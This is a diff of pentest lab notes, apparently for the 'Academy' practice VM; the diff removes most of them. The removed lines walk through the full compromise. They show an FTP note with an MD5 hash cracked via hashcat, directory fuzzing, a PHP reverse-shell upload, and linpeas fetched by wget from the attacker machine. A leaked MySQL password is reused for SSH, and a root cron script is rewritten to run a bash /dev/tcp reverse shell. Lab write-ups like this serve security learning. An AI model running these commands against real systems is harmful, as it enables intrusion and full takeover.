@@ -1,68 +1,6 @@
 21/tcp    open     ftp     vsftpd 3.0.3
 | ftp-anon: Anonymous FTP login allowed (FTP code 230)
 |_-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
-
-	-> I want to see what that note.txt has
-
-	note.txt =>> INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
-	('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
-
-		user 10201321
-		pass cd73502828457d15655bbd7a63fb0bc8 -> hash?
-
-	$ hash-identifier -> paste hash -> md5
-
-	to crack: $ hash-cat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
-
-		cd73502828457d15655bbd7a63fb0bc8:student
-
-	userID - 10201321
-	pass - student
-
-	lets do a directory busting 
-
-	$ dirb http://<ip> -> take so long
-
-	$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://192.168.50.142/FUZZ -> academy phpmyadmin server-status
-
-		lets go to http://192.168.50.142/academy -> input id and pass -> WORKS
-
-		uploads to http://192.168.50.142/academy/studentphoto/ folder
-
-		using https://github.com/pentestmonkey/php-reverse-shell
-
-		lets make a listener with $ nc -nvlp 1234
-
-		lets upload that shell.php file -> we are in as www-data user
-
-	$ whoami
-	www-data
-
-	privilege escalation...
-
-		using linpeas https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS -> download -> put in transfers folder -> cd to it and host webserver $ python3 -m http.server 80
-
-		now on academy $ cd /tmp -> $ wget http://192.168.50.228/linpeas.sh -> chmod it and run it -> looking for red stuff
-
-		FOUND:
-			grimmie administrator 112 May 30  2021 /home/grimmie/backup.sh
-			$mysql_password = "My_V3ryS3cur3_P4ss";
-
-		tried ssh grimmie@192.168.50.142  with My_V3ryS3cur3_P4ss pass -> worked
-		
-		there is backup.sh that could be uset to create reverse shell for root!!! (linpeas again?!?)
-		
-		lets use this to get linux processes running https://github.com/DominicBreuker/pspy -> download -> put in transfers folder and wget on academy vm
-		
-		after chmod and run pspy64: 
-			2023/03/12 06:34:01 CMD: UID=0     PID=13992  | /bin/sh -c /home/grimmie/backup.sh 
-			2023/03/12 06:34:01 CMD: UID=0     PID=13993  | /bin/bash /home/grimmie/backup.sh 
-			2023/03/12 06:34:01 CMD: UID=0     PID=13994  | /bin/bash /home/grimmie/backup.sh 
-			2023/03/12 06:34:01 CMD: UID=0     PID=13995  | /bin/bash /home/grimmie/backup.sh 
-			
-		using this https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet -> in bachup shell script $ bash -i >& /dev/tcp/192.168.50.228/8081 0>&1
-		do $ nc -nvlp 8081
-		edit bachup script so that it contains only "bash -i >& /dev/tcp/192.168.50.228/8081 0>&1" and w8 for the reverse shell
 		
 
 80/tcp    open     http    Apache httpd 2.4.38 ((Debian))
@@ -71,8 +9,6 @@
 
 
 http://192.168.50.142/ returns default web page 
-
-
 
 
 Apache/2.4.38 (Debian) Server at 192.168.50.142 Port 80
